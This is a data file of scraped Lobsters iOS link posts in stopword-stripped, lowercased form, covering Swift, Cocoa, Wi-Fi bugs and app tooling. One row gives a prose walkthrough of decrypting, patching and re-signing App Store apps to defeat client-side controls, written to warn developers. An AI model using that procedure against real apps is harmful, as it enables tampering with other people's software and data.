476,Lobsters,ios,Apple iOS,Alfred App - Alfred Remote on iOS for Alfred 2,http://www.alfredapp.com/remote/,alfred app alfred remote io alfred,,single touch iphone ipad control alfred application mac alfred remote keep frequently used action fingertip whether work play productive ever use handy icon io device control many alfred action mac replacing hardtoremember hotkeys keywords launch apps file website control music keep useful text snippet hand boost productivity connecting remote favourite alfred workflow
477,Lobsters,ios,Apple iOS,Creating a Task Application for iOS using Swift,http://developer.telerik.com/featured/creating-task-application-ios-using-swift/,creating task application io using swift,telerik ui io discontinued uwp xamarin kendo ui angular kendo ui react mean customer documentation resource telerik ui xamarin question address,telerik ui io discontinued taking decision easy multiple factor taken consideration time changing mobile development trend native mobile application development become preferred method creating mobile apps io android existing crossplatform framework hardly compete always stood developer productivity believe road productivity paved skill reuse targeting multiple platform single code base deliver truly native application focusing product portfolio enhance productivity working popular rising development platform way continue provide best ui productivity tool help developer keep pace latest trend technology staying true calling increasing investment tooling around latest technology developer need includes net related product like uwp xamarin javascript offering kendo ui angular brandnew kendo ui react name mean customer effective immediately new feature product update accompanying documentation resource remain available understand might inconvenience strongly advice try telerik ui xamarin continue building io mobile application question address ready best answer question comment might drop u line reply soon possible
478,Lobsters,ios,Apple iOS,"BlackBerry CEO prods regulators for 'app neutrality,' wants cross-platform iMessage",http://appleinsider.com/articles/15/01/22/blackberry-ceo-prods-regulators-for-app-neutrality-wants-cross-platform-imessage,blackberry ceo prod regulator app neutrality want crossplatform imessage,wrote,comparing net neutrality debate expansion railroad century blackberry ceo john chen tuesday called authority force company apple netflix make service available consumer regardless platform carrier like railway last century building track carry traffic point throughout country chen wrote blog post adapted letter sent member congress railway car travelling track today internet world controlled carrier content application provider therefore truly open internet policymakers demand openness traffictransport layer also contentapplications layer ecosystem chen specifically called apple imessage netflix example two popular service available consumer running blackberry device developer preference support two largest platform created twotiered wireless broadband ecosystem iphone android user able access far content application customer using device running operating system argues expected chen pointed blackberry content neutrality strategy seen company open blackberry messenger blackberry enterprise server io android relatively recent tactic however service available blackberry subscriber nearly decade introduction decision open bbm reportedly source major internal strife blackberry company cofounder jim balsillie pushing hard move severing tie company thenceo thorsten heins killed plan abject failure blackberry smartphones left company even behind apple io google android device program reinstated chen prominent figure taking rein blackberry company remains major player enterprise neither likely help push idea app neutrality however given economic burden would place smaller company highly intrusive nature regulation
480,Lobsters,ios,Apple iOS,Two mysterious background video bugs,http://www.tedunangst.com/flak/post/two-mysterious-background-video-bugs,two mysterious background video bug,bug software thought,watching netflix joss whedon astonishing xmen ipad take break catching reading safari suddenly next episode start playing background short later probably minute later weird quite unexpectedthis seems like good time laugh choice proprietary closed system complexity study understand without source probably blame drm good measure might reply strawman rms granting access io source unlikely inspire study reason experience bug like laptop laptop open source fact desktop environment dwm dwm somewhat lacking magic background video playback departmentcuriously think better understand netflix play video ipads bug switched back netflix app still showing browse ui even netflix know playing videowait say experience bug like laptop hour first bug coincidentally experienced practically bug firefox provoking post browsing steam store firefox video started autoplaying finished reading part page interested closed tab sure guessed audio portion video continued play onso let see web page say put noise ted head firefox say totally reasonable request decide enough noise close tab saying please stop noise firefox say ridiculous request denied computer user decide whether make noise irony despite many barrier understanding io netflix bug able solve pretty quickly double click force quit netflix stopped hand despite knowing way around openbsd fairly well know stop well could nuked firefox process easily enough unlike closing single purpose video app closing desktop browser throw away lot user state oh source fix rather prefer toopen source miracle panacea complex software bug proprietary software often complex counterexample exist certainly think sufficient open source example exist demonstrate inherent anticomplexity warding power weak nonethe vaccine looking instead called complex software posted jan tedu updated jan tagged bug software thought
482,Lobsters,ios,Apple iOS,The 300 ms Click Delay and iOS 8,http://developer.telerik.com/featured/300-ms-click-delay-ios-8/,m click delay io,challenge partnership community deliver expected,challenge demand better user experience continues grow time develop high quality modern engaging application continues shrink stop sweating ui focus part application truly make differencepartnership community like developer purpose life make developer superheroes enabling deliver expected faster expected nearly two decade partnering community two million developer help cut development time increase productivity make easy embrace latest technology user experience trendsdeliver expected using modern featurerich professionally designed ui component telerik kendo ui armed everything need deliver outstanding web mobile desktop experience le timewith backing legendary technical support provided directly developer build product confident best partner rely journey
483,Lobsters,ios,Apple iOS,The Death of Cocoa,http://nshipster.com/the-death-of-cocoa/,death cocoa,thing go south rfc documentation number toplevel function operator literal binary octal hexadecimal addition decimal string written previously swift literal convertible default protocol implementation article uri url urn something along line rfc rfc data structure rawoptionsettype nate cook nice complete implementation date time french republican calendar idea interchange format pubsub property list regular expression wrapper error us error pointer appkit uikit thinking mother demo apology douglas engelbart functionality offered standard library production budget movie max speed mcdonnell douglas hornet shape france converting mile kilometer clustering value knowing size earth unicode common locale data repository cldr libphonenumber healthkit already swift standard library collision course cocoa new language continues gain momentum one expect see fracturing reinvention within system framework,cocoa de facto standard library objectivec containing many essential framework working language foundation appkit core data cocoa touch basically cocoa uikit substituted appkit often used interchangeably cocoa refer system framework io many u simplicity elegance performance apple hardware software working together reason build platform indeed shortage word penned site adulation cocoa design functionality yet month working swift cocoa begun lose luster saw swift beginning end objectivec cocoa first time apple standard library would made obsolete remember carbon swift designed modern language feature allow safer performant code however one could forgiven seeing swift little distraction compiler tool team swift advantage trickle conventional application usage objectivec swift code interoperate meaningful way launch arguably allowing adventurous engineer within team lowrisk way introduce swift existing code base crucial wide adoption new language already seen effort put source mapping api auditing argument made cocoa become something liability build new foundation swift standard library would differently could learn mistake past may seem odd thesis nshipster site founded upon great deal affection objectivec cocoa one worth exploring close historic year apple developer let take moment look forward possibility going forward seen standing shoulder giant isaac newton owe productivity standard library done well standard library provide common implementation useful programming construct clarify concept transferable way language standard library diverges existing even internal convention thing go south example nsurlcomponents conforms rfc fact made explicit documentation api consumer osmotically absorb proper terminology concept byproduct usage newcomer api already familiar rfc hit ground running much easier write documentation rtfm link spec standard library implement standard talk technology intuitive usually mean familiar standard ietf iso body common ground new standard library built based assertion let take look specific example cocoa new swift standard library could improve number nsnumber exists purely object wrapper around integer float double boolean primitive without concern swift practical role construct swift standard library done remarkable job structuring numeric primitive clever combination toplevel function operator type hierarchy bonus point including literal binary octal hexadecimal addition decimal lack real complaint currently suggestion might added string peril string encode many different kind information written previously string perhaps versatile data type computing passed around symbol used encode numeric value associate value key represent resource path store linguistic content format information nsstring perhaps versatile though although handle unicode like champ entire api burdened conflation string path stringbyappendingpathcomponent ilk genuinely useful usefulness ultimately stem misappropriation string url much due fact string literal much convenient nsurl urlwithstring constructor however swift literal convertible easy build url path value one truly clever design choice swift string internal use encodingindependent unicode character exposed view specific encoding collection code unit accessed string property collection code unit accessed string property collection unicode scalar value equivalent string encoding form accessed string unicodescalars property one complaint swift string much functionality hampered way functionality hidden toplevel function developer trained type wait method completion something like count le obvious consult toplevel countelements function described default protocol implementation article could solved either xcode swift allowed automatic bridging explicit implicit self function uri url urn ideal url implementation would valuetype ie struct implementation nsurlcomponents would take aforementioned pathrelated apis currently nsstring something along line clear implementation uri scheme according rfc could mitigate conflation file file url currently nsurl nice implementation urn according rfc would wonder getting developer realize urn uris url urn relate one another transferrable skill data structure swift functional data structure generator sequence collection well beautiful use array dictionary literal syntactic sugar strike fine balance interesting underlying contour standard library building strong primitive remarkably easy create productionready implementation data structure undergraduate computer science curriculum armed wikipedia spare afternoon pretty much anyone could least get close amazing swift standard library provided canonical implementation bunch eg tree singly doublylinked list queue stack make case one set three big collection foundation nsarray nsdictionary nsset mutable counterpart set one currently missing fundamental data structure applicable wide variety use case specifically swift though set could resolve one awkward corner consideration nate cook built nice complete implementation set date time calendaring functionality oldest robust cocoa whereas language date time programming cause fear one get sense dread working nsdate nscalendar however suffers difficult use impossible extend order calendaring calculation getting date one month today one would use nscalendar nsdatecomponents correct way majority developer probably still use datewithtimeintervalsincenow constant number second hardcoded tragically enough api thing right way must also easier wrong way another shortfall albeit incredibly minor nscalendar allow new calendar added someone darnedest advocate conversion french republican calendar bothersome fortunately new language feature swift could used solve problem really elegant way take work implement calendaring system based generic could really something anyone want take challenge idea interchange format one astonishing thing objectivec long took standard way working json io o x lion developer hoping work popular interchange format new web service forced choose one handful mutually incompatible thirdparty library however nsjsonserialization miserable experience swift repeating history new crop thirdparty alternative swift objectivec let data nsdata var error nserror nil let json nsjsonserializationjsonobjectwithdata data option nil error error nsdictionary product json product nsarray let name string product name string let price double product price double nsdata data nserror error nil id json nsjsonserialization jsonobjectwithdata data error error error id product json product nsstring name product name nsnumber price product price defense apple asked engineer wwdc lab took long io support json answer made lot sense paraphrasing apple company long view technology really difficult tell whether technology like json going stick another fad apple released framework pubsub despite widely known used still supported foreseeable future technology gamble engineering resource data marshaling serialization boring task boring task exactly standard library take care apple knew developing cocoa robust implementation text binary property list lifeblood io o x may difficult anticipate interchange format viable long term providing official support emerging technology probationary basis would lot improve thing developer regular expression regexes staple scripting often dedicated syntax literal swift ever move cocoa would welladvised include successor nsregularexpression wrapper error objectivec rather exceptional us error pointer nserror communicate runtime failure rather throwing exception pattern every cocoa developer familiar nserror error nil bool success nsfilemanager defaultmanager moveitematpath pathtotarget topath pathtodestination error error success nslog error parameter error workaround fact objectivec single return value something go wrong nserror instance populated new object detail issue swift pattern unnecessary since method return tuple optional value error instead func moveitematpath string topath string bool nserror even take thing step define generic result type associated value success failure case struct error public enum result case success case failure error using new pattern error handling enforced compiler order exhaust possible case httpclientgetuser result switch result case success let user success case failure let error failure pattern like emerged community eager improve existing pattern pure swift setting would helpful standard library codify useful pattern order create shared vocabulary elevates level discourse among developer appkit uikit appkit uikit entire topic unto much likely two would take step unify rewritten adapted swift anytime soon much interesting question whether swift expand beyond purview io o x development system web scripting would fundamentally change role cocoa de facto standard library thinking perhaps thinking small standard library wolfram language mother demo apology douglas engelbart programming language granted wolfram parallel universe computation nothing else exists language hot mess overview functionality offered standard library visualization graph analysis data analytics image processing audio processing machine learning equation solving algebraic computation arbitrary precision calculus computation matrix computation string manipulation combinatorial optimization computational geometry database connectivity builtin testing device connectivity functional programming natural language understanding sequence analysis time series geographic data geomapping weather data physic chemistry data genomic data unit measure control theory reliability analysis parallel computation engineering data financial data financial computation socioeconomic data popular culture data boolean computation number theory document generation table formatting mathematical typesetting interactive control interface building form construction xml templating conventional wisdom would suggest yes unreasonable standard library encode production budget movie avatar max speed mcdonnell douglas hornet shape france information retrieved querying imdb scraping wikipedia importing gi system thing like converting mile kilometer clustering value knowing size thing would generally useful variety different application indeed set cocoa apart standard library specific information encodes nslocale nscalendar come unicode common locale data repository cldr stop standard library pulling data source expose interface libphonenumber expand healthkit already fundamental unit incorporating kind data organized meaningful way much expect thirdparty framework important delegate free market open source yes many way question role standard library question role public private sector society thirdparty libertarian meet thirdparty librarytarians swift compelling term language mean apple io o x developer developer community large many factor play question technical feasibility extricated social economic consequence swift released open source license swift unseat javascript viable web scripting language adding interpreter safari ultimately kind deciding factor become swift standard library swift become portable system scripting language would first need extricate objectivec runtime web heavy dependency almost certain however cocoa like objectivec doomed much question whether talking year one really arguing objectivec cocoa going away entirely swift standard library collision course cocoa new language continues gain momentum one expect see fracturing reinvention within system framework year technology served u well best honor contribution learn mistake make sure replaces insanely great
484,Lobsters,ios,Apple iOS,The future of interface building in Cocoa,https://dirk.to/blog/2014/12/18/future-of-interface-building.html,future interface building cocoa,lot stylesheets appkit uikit interface builder isolation mode curse interactivity mvvm way forward ibdesignable ibinspectable computed property,methodology building interface cocoa changed lot past year tension side buildinginterfacesthroughcode side buildinginterfacesthroughinterface builder former give far immediate control interface appear sort stuff price really long hairy view code hundred line verbose boilerplate code filled integer constant layout math pretty sight attempt reduce cssinspired stylesheets configuring interface layout system appkit uikit different html dom adaptation really feel natural work well alternative course use interface builder apple want however interface builder long big clunky system prone weird behavior also best navigation worked like adobe illustrator one easily navigate hierarchical document double click extremelyuseful isolation mode curse interactivity compound struggle must toss fact interface must interactive introduces whole new set demand build interface interfacesthroughcode approach requires throw even minutiafilled animation code interface builderbased approach requires wade arcane animation system neither appealing prospect furthermore interface accept andor present information fromto external source must add glue code handle shuffling data interface backend data system people tried declutter mvvm approach far seems ended multiplying amount glue code introducing extra complexity opportunity bug andor confusion deal model view model view controller view lot layer onion probably going cause lot tear way forward good news apple seems making great stride simplifying whole setup first new ibdesignable ibinspectable system allow far powerful interface construction closer tiein see interface builder write code user ultimately experience application truly great second powerful new computed property functionality swift using lot recently bridge gap data view controller data visual interface instead complicated glue code view class whole viewmodel sitting use computed property getter setter view class view controller interacts computed property providing clear separation concern view controller backend data layer view frontend presentation layer muchsimplified version arrangement class viewcontroller func doingsomething bar bazobject viewbar bar func doingsomethingelse let bar viewbar greatcomplexity bar class view get return bar baz textfieldtext set bar textfieldtext barbaz compared clunky glue code past feel like breath fresh spring air could bring sort straightforward controllerview connection clean code environment looking html javascript
487,Lobsters,ios,Apple iOS,Looking for technical users to Beta test SuperBeam for iOS (P2P file transfer),https://docs.google.com/a/ryanbrink.ca/forms/d/1-lRGyXlwaPPWJS4V2AoG_aD9O0Eml1nEnke0PhUskbo/viewform,looking technical user beta test superbeam io file transfer,,never submit password google form
488,Lobsters,ios,Apple iOS,WiFried: iOS 8 WiFi Performance Issues,https://medium.com/@mariociabarra/wifried-ios-8-wifi-performance-issues-3029a164ce94,wifried io wifi performance issue,wifried io wifi issue bonjour awdl please bonjour apple confirmed severe wifi degradation issue still occurs io osx fixed background awdl awdl work channel time device service happen discoveryd reproducing wifi performance issue wifi jitteryslow transfer speed reproduce issue iphone added slow ping ssh bug reproduce issue airdrop everyone v contact v bouncing wifireassociating wifi fix io wifi http githubcommariociabarrawifried one last yosemite wifi issue fix continues turning awdl apple user choice http hacker wanted quantum metric mariociabarra linkedin indepth look awdl yosemite,wifried io wifi issuethanks alisaa suggestion wavy baconbonjour awdl please nothere many internet forum thousand user scratching head wondering reason wifi performance severely degraded io router dns setting please help folk need reset network setting morei narrowed issue use apple wireless direct link awdl used airdrop airplay gaming connectionsi go limb say wifi issue apple choice using bonjour awdl given constraint wifi hardware difficult get right perhaps crazy bug fixed appleapple keep bonjour bluetooth connected wifi network really justifiable gain advertising browsing service wifi v bluetooth missed something need work without interferencei confirmed severe wifi degradation issue stilloccurs io osx fixedbackgroundwhat awdl awdl apple wireless direct link low latencyhigh speed wifi peerto peerconnection apple us everywhere expect airdrop gamekit also us bluetooth airplay perhaps elsewhere work using dedicated network interface typically service like instant hotspot bluetooth tethering course gamekit advertise service bluetooth sdp apple decided advertise airdrop wifi inadvertently destroyed wifi performance million yosemite io usershow awdl work since iphone io kernel multiple wifi interface wifi broadcom hardware primary wifi access point interface used wifi apple wireless direct link interface since io multiple interface apple able standard wifi connection still broadcasting browsing resolving peer peer connection well channel time one time wifi chip communicate one frequency thus interface would need channel attempting use interface time typically work well device near likely connected access point using channeli test device connected different channel one one still able airdrop successfully impressive albeit obvious transfer chunking normal transfer rate device device service happen discoveryddiscoveryd previously named mdnsresponder load plugins located systemlibraryprivateframeworksdevicetodevicemanagerframeworkplugins specific one causing issue plugins one wifi one bluetooth mentioned service instant hotspot broadcast bluetooth interface others airdrop airplay gamekit may broadcast multiple interface including bluetooth awdl course standard wifi interfacesreproducing wifi performance issueswifi jitteryslow transfer speedsthe performance degradation bigger two symptom understood look simple addressfix long journey get herewhen device advertising browsing service interference wifi transmission perhaps kind tdma wifi chip support multiple interface performance effect apparent easy reproduceios wifi performance issue comparison videoeffects awdl io wifi performanceto reproduce issue iphoneperform speed test many apps choose simply pull open control center cause discoveryd process browse advertise service wifi interface see immediate reduction wifi speed continue minute two awdl interface continues browseadvertise occurs bluetooth turned well turned appear bluetooth coexistence issue bluetooth wifi overlap frequency case also use chip even interesting cause issue nearby device instead opening control center speed testing device successfully induced wifi issue simply waking nearby io device waking process begin browse advertise service affect nearby added reproduce turn airdrop begin speed test secondary device open photo app choose photo press action icon bottom left see wifi severely degradeslow ping ssh bug iphone consistently see ping time go second every ping yes care ping much affect performance jb community believe folk referring ssh bug issue causing second delay every key interestingly send data often ping latency go away ie type pretty quickly long period connection fast press key second notice second delay keythis issue occurs kernel disables awdl seems odd system log show kernel domonitortimer disabling awdl due service idle linkto reproduce issue iphone easiest way reproduce pingssh issue set airdrop control center pull open close control center wait second phone screen best performing activity io device nearby least bluetooth seems awdl remain around longer device present per kernel log statement system log specific environmental factor made narrowing root cause difficult sure caused issued apple trying locate issue wellonce problem begin go away time service advertised browsed resolved layman term open control center ping time go back normal closed another second kernel disables awdl airdrop everyone v contact v offthere specific nuance surrounding whether airdrop set advertise one contact everyone however despite choose issue still remains different sequencestime periodsetcbouncing wifireassociating wifipart confusion fix due fact io device reconnects ap either turn offon wifi phone forgetreconnect awdl characteristic resetdisabled period timethus wifi performance restores upon wifi bounce discoveryd begin browseadvertise routine causing performance degradation ping lag issue kernel disables awdl againuntil figured made quite difficult troubleshooting fix io wifihow often actually use airdrop play game nearby device airplay directly another device connected wifi used airdrop cool enjoyed worth wifi issue causingi created disable feature conveniently located airdrop menu located control center jailbroken pick cydia free called wifried wifried allow enabledisable conveniently turned offon airdrop setting control centeri post source github shortlyedit http githubcommariociabarrawifriedone last wifi issue fixthis issue root cause severe wifi performance degradation affecting user yosemite continues although airdrop introduced osx lion used awdl release io perhaps sharing bad new code airdrop awdl active since io yet issue seems suddenly appeared io rpetrich mentioned airdrop used two incompatible identically named protocol yosemiteios perhaps change continuity introduced bug areaturning awdlperhaps surprising apple user actually easily see turn awdlairdrop yosemite remove left side finder fix issue apple user choice either way fix yosemite wifi issue cost disabling awdl airdrop typing following command osx terminal sudo ifconfig downand vice versa restore airdrop awdl wifi issue sudo ifconfig upfor clarification w lowercase l number zero update older mac smacbooks may interface yosemite due hardware incompatibility based http look like full airdrop probably support awdlmore hacker wanted reversed io related framework trial error determined mostly kerneldriver issue much io userland code except initiation advertising browsing resolving glanced yosemite version detail work inclined fire ida take look following framework perhaps able figure ciabarra cofounder ceo quantum metric life wife kid beautiful colorado spring mariociabarra linkedindecember update indepth look awdl yosemite
489,Lobsters,ios,Apple iOS,Become Part of the Web of Apps: Developers tricks to increase mobile app usage,http://blogs.telerik.com/blogs/14-11-18/become-part-of-the-web-of-apps-developers-tricks-to-drive-app-engagement-up,become part web apps developer trick increase mobile app usage,app index become part web apps app index tutorial deep link reengage user deep linking deep linking foundation new mobile web tag apps lose time republishing app every single update android io web apps ui android ui io,mobile developer facing severe limitation come app distribution app content almost invisible browser search apptoapp connection scarce app discovery channel marketplace search algorithm still evolving improving app update need go tedious resubmission process relevant marketplace let look technology help u overcome limitation app index become part web apps built android app app index yet already losing potential reengagement indexing android app mean inapp content become accessible mobile search user already installed app little green text title link informs user sent mobile app know hard get user reinteract app abandoned google app indexing great step toward making easier technically pretty simple follow tutorial get started feature available android apps make sense expect work operating system future screenshot source http developersgooglecomappindexingwebmasters deep link reengage user google app indexing available nonandroid apps app take advantage deep linking core technology google app indexing us deep linking powerful tool increase user engagement used countless scenario increase roi advertising email nurture campaign user sent relevant content even include call uber button make sense context app check deep linking foundation new mobile web deep dive deep linking image source http mobileads tag apps lose time republishing app every single update web allows realtime update content feature mobile apps practically frozen installed user device point developer push update app user base user agrees google tag manager gtm mobile apps provides effective way solve challenge extent gtm enabled apps fairly simple change configuration value apps though gtm interface without rebuild resubmit application binary app marketplace work across device support mobile website native mobile apps control configuration various ui setting display string size location language well type ad served app getting started guide walk process detail android io apps web apps marketplace probably stay place user search apps many untapped opportunity mobile app owner reach existing potential customer web apps evolve willingness mobile developer become part transformation already using technology app glad hear solve challenge mobile developer going native way check telerik ui android ui io
490,Lobsters,ios,Apple iOS,The Trials and Tribulations of Writing a 3rd Party iOS Keyboard,http://beta-blog.archagon.net/2014/11/08/the-trials-and-tribulations-of-writing-a-3rd-party-ios-keyboard/,trial tribulation writing party io keyboard,please click,page moved automatically redirected please click
492,Lobsters,ios,Apple iOS,How App Store Apps are Hacked on Non-Jailbroken Phones,http://www.zdziarski.com/blog/?p=4002,app store apps hacked nonjailbroken phone,rely selfexpiring messaging apps step decrypting application clutch high speed io decryption system step patch binary alter behavior hopper step sign binary developer credential repackage step copy provisioning profile application xcode implication solution conclusion need know wirelurker,brief post show hacker able download app store application patch binary upload nonjailbroken device using original app id without device aware anything amiss done developer certificate apple optionally disassembler also enterprise enrollment modified application loaded onto io device without first registering udid great black bag job intelligence community rely selfexpiring messaging apps known quite sometime iphone development community sign application binary using dev certificate nobody taken time write exactly people thought would explain considered security vulnerability although could certainly used load malicious copycat application onto someone iphone physical access byproduct developer signing right device enabled custom developer profile lesson developer snapchat others rely clientside logic client application trusted critical program logic mean nontechnical reader plain english mean snapchat well selfexpiring messaging app app store hacked recipient expire photo message send nobrainer seems lot confusion hence technical explanation developer putting access control client side taboo developer understand application hacked jailbroken device manipulate program realize done nonjailbroken device numerous jailbreak tweak unlimited skip pandora prevent snapchat message expiring even add favorite mention tweetbot ability hack application good application serverside certain type apps however designed way depend client logic enforce access control take snapchat example whose expiring message require client make photo inaccessible certain period time type application put enduser risk sense likely send compromising content party necessarily trust thinking least message expire apple hedged garden approach given endusers developer false sense security application susceptible hacked long jailbreak result many developer incorporated counterjailbreaking technique apps also hacked assume device jailbroken trusted developer even go far assume application always behave way designed often byproduct little reverse engineering experience brief explanation hacker using apple developer program manipulate application trusted platform nothing new thought would good idea document step decrypting application application modified must first decrypted apple us form drm similar fairplay application decryption done hand method outlined book hacking securing io application made simple number free tool hacked app loaded onto nonjailbroken device need first use jailbroken device decrypt app device need personal data popular tool job used largely software piracy scene although many legitimate research us clutch high speed io decryption system one command clutch decrypt repackage application ipa zip file copied desktop machine patching application decrypted loaded memory attached debugger run operating system decrypt run setting breakpoint dumping memory program start address get complete decrypted dump executable code encrypted part file overwritten inplace decrypted copy cryptid field unset smooth sailing step patch binary alter behavior transferring decrypted ipa file back desktop unzipped application found payload directory depending kind functionality attacker looking binary patched change behavior case snapchat application claim selfexpiring message application timer fudged prevent message ever expiring virtually every selfexpiring messaging program even well respected one must code expire message client side matter finding patching patching done open source disassembler although process made much easier tool like hopper well worth let take twitter application example hate pesky ad attacker could easily modify binary simply nop certain check disable one example override check function named tnfdisallowpromotedcontent disables ad twitter employee guess eat part dog food nop command overwrite logic check would turn ad nonemployees twitter perhaps twitter employee forced look ad might realize annoying also poor analytics step sign binary developer credential repackage binary modified original signature become invalid developer program enrollment come play attacker target iphone know difference original developer certificate simply resigned using apple codesign utility signed entire directory structure zipped back renamed ipa step copy provisioning profile application xcode using xcode target device loaded attacker provisioning profile registered udid device unless part apple enterprise developer program enterprise developer paid get load application io device without register udid first application simply dragged onto phone xcode organizer window pop target phone look function like original application phone user none wiser fact app store application even check update software believing official app installed unless attacker change identifier patched twitter app work fine push notification feature suppresses advertising implication ability override program logic allow number potential risk developer need aware type attack could used prevent incoming photo message ever expiring allow screenshot used etc going beyond snapchat style apps attack payment processing apps banking apps even mobile device apps could potentially performed attempt access data end user otherwise access consider real world vulnerability existed one time certain payment processing application kept log transaction client relied client logic limit refund amount exceed purchase amount vulnerability allowed attacker steal merchant io device patch binary let charge refund drafted automatically merchant account programming error could potentially leave small business bankrupt gone unnoticed done subtly far fetched plausible attack might include adding subroutine code would copy user credential personal data send remote server user used application attack would require physical access device well pin possible user would think using app always use technique would used introduce trojan example consider ceo diplomat targeted government mobile device seized airport certain period time patched copy secure messaging app could loaded onto device replacing existing one course none easy pull requires physical get idea solution current way application designed install run io including allow modified binary signed developer difficult problem address apple could potentially mitigate risk would require redesign though possibly would complete solution type trusted computing involving secure enclave likely going necessary addition good design first step mitigating risk would apple implement codesign pinning certain app identifier would added developer cert enforced o example would prevent anyone using bundle identifier comfacebook except facebook would bundle signed cert prevents identifier reuse bigger problem remains application server talk ensure talking legitimate copy application remotely example ensuring two snapchat apps talking really legit one idea sent matthew green o able inform application somehow running distribution signature check apple app store form signed token generated secure element token sent peer validation example alice want sent bob picture alice initiate request authenticate bob application bob application talk io via framework examines application signature verifies valid app store distribution signature sign token provides back application get sent alice device alice device must mechanism authenticate token device secure element tell application go forward transfer authentication fails alice phone refuse send photo another idea think similar matthew supply developer extension existing common crypto framework developer marry session key special key inside secure enclave form key derivation function derived key valid calling application verified o valid distribution signature way server depend encryption succeeding gone secure element subsequently trusted verified application somehow server side need coordinate possibly seeding via appleissued distribution certificate idea may mitigate binary patch still contend runtime abuse jailbroken phone apple need perform proper jailbreak detection within secure element conclusion issue going go away time soon desktop machine operating system even susceptible running modified binary malware trojan often work developer simply need aware technical capability possible stop trusting apple hedged garden sandbox protect application logic execution space client machine never considered secure never unfortunately seems developer starting slip secure programming practice moral story developer simply trust end user includes code running device moral story end user trust developer refrain sending content people trust case third party application app store hacked whether selfexpiring photo data anything send mercy recipient might also want read need know wirelurker explains malware used technique conjunction hijacked pair record install decoy apps iphones real vulnerability case trojan pirated chinese software however technique combined trojan little social engineering made interesting attack
493,Lobsters,ios,Apple iOS,Why iOS Developers Still Need to Know Objective-C,http://developer.telerik.com/featured/ios-developers-still-need-know-objective-c/,io developer still need know objectivec,wwdc swift future message swift developer learn objectivec since swift launched debugging nasty bug many even nasty bug table view section io empty search history taught u transition going take time transition guide autolayout demo code production code swift still evolving nt say ignore everything pen image provided space shuttle image provided dlrthilo kranz,remember well wwdc apple first announced new programming language io called swift first thought passed mind attendee something along line wait love objectivec got ta learn another language way build apps io apple quickly put developer room ease gently introduced swift provided answer looking apple announced io developer use swift would benefit modern language included plethora new feature strong typing type inference generic etc feature objectivec developer excited cost turn cost learning swift programming language learning new programming language certainly nt scare away objectivec developer none new feature swift showstopper using objectivec build mobile apps since march iphone o thing quite different developer either little experience developing objectivec thought seemed following yes successfully avoided objectivec swift file header implementation file awesome total ripoff insert language rest talk could hear swift swift swift key takeaway swift replacement objectivec future last part quickly forgotten message swift developer let look following objectivec snippet multidimensional array display value output window xcode import foundationfoundationh int main array row column int int j output array element value j j j nslog dn j j return result anything look familar maybe declaration j loop going declaration silly syntax nslog know nt want write code neither regardless want going looking time learn objectivec since swift launched good question let address reason debugging nasty bug built published app mobile store certainly ran nasty bug somewhere development process know many regardless using swift objectivec write app underlying framework written objectivec bug deep execution stack require knowledge swift language even nasty bug writing app swift encountered problem tableview suppose show data nt great programmer would quick search google table view section io empty search result quickly see included many solution unforunately involved objectivec code included swift search unforunately nt solution getting started guide writing long take solution include swift one year two year one know know developer community speaks objectivec io developer community speaks objectivec history taught u transition going take time many time cringe saw release retain well automatic reference counting arc implemented apple released transition guide supposed ease pain instead many developer went habit keep using manual reference counting autolayout developer tried first designer could nt get effect wanted code still nt get wanted dismissed saying next version xcode come thing take time developer adopt two example demo code production code saw fast swift wwdc keynote fast really comparison various blog stackoverflow using various build swift swift perform realworld application need speed used objectivec rest assured time swift get better time wait swift still evolving swift know purpose nothing beat experience big brother objectivec need add c code io app need know objectivec nt say ignore first admit objectivec hard learn swift much easier nt get wrong nt know everything objectivec write apps swift able read well enough get hump described swift bright future take time mature objectivec personally look forward developing swift stick objectivec feel free leave comment right way base pen image provided space shuttle image provided dlrthilo kranz
495,Lobsters,ios,Apple iOS,How Does the iOS 8 Time-lapse Feature Work?,http://www.studioneat.com/blogs/main/15467765-how-does-the-ios-8-time-lapse-feature-work,io timelapse feature work,frameographer sherlocked website recording duration frame capture rate speed relative real time glif minute minute hyperlapse frameographer video stabilization,io apple added new feature builtin camera app timelapse announcement wwdc earlier year brought initial wave panic tom maker stop motion timelapse app frameographer thought sherlocked fortunately nt seem case timelapse mode apple introduced lack feature option raise question timelapse mode actually work camera app timelapse new mode toggle located furthest left mode selector aside focus exposure option available mode camera app timelapse mode single button start stop timelapse everything timelapse creating completely obfuscated many frame per second captured fast video sped relative real time framerate resulting video question demand answer apple website claim timelapse mode io work snapping photo dynamically selected interval first read thought something super fancy like monitoring frame movement snapping picture something change deeper reflection would bad idea timelapse video look best buttery smooth dynamically selecting interval fashion would create jittery jerky video apple mean dynamically selected interval turn apple quite simple indeed pretty clever ran several test shooting timelapse video various duration view spreadsheet test ran apple mean dynamically selected interval doubling speed timelapse taking half many picture per second recording duration double sound complex actually simple recording duration frame capture rate speed relative real time le minute frame every second minute minute frame every second minute minute frame every second minute hour minute frame every second hour minute hour minute frame every second efficient way assemble timelapse start recording timelapse app capture frame per second recording period extends beyond minute app switch capturing frame per second deletes every frame captured first minute recording duration double minute thing happens app capturing frame every second previous frame dropped match tempo forth longest video recorded hour presumably using method could record much longer apple website casually mention hour app efficient frame capture storage nt need worry phone capacity filling result method anything shoot generally end second long ideal shareable length also worth mentioning resulting video always fps standard framerate video surprise therei found nice lookout austin glif new iphone tripod shoot example video recorded minute timelapse mode resulting video second long fps video recorded minute timelapse mode resulting video also second long fps time faster minute video time faster real time note speed cloud obvious difference also shot video minute minute video shot iphone uneditedso would use timelapse mode builtin camera app opposed hyperlapse frameographer true apple fashion timelapse mode dead simple option mess hyperlapse however also dead simple feature incredible video stabilization great choice quick casual timelapses camera stabilized tripod making le casual timelapse take half hour record would definitely recommend something like frameographer lieu built timelapse feature biased obviously opinion putting much time creation timelapse say final output apps like frameographer allow adjust speed framerate frame shot said thrilled apple decided include timelapse new camera mode hopefully introduce many people fun easy make timelapses
498,Lobsters,ios,Apple iOS,iOS file upload issue - iOS 7.1.2 and iOS 8 (beta) - Mobile Safari - Stack Overflow,https://stackoverflow.com/questions/25659190/ios-file-upload-issue-ios-7-1-2-and-ios-8-beta-mobile-safari/25936215#25936215,io file upload issue io io beta mobile safari stack overflow,,actually file upload work fine io safari image come screen shot iphone camera example take photo camera iphone try upload file via browser input typefile send empty data src data send image email download email upload work take screen shot photo work src data imagejpeg idea hint please u know angluar j used file upload nodejs server regard alan mehio
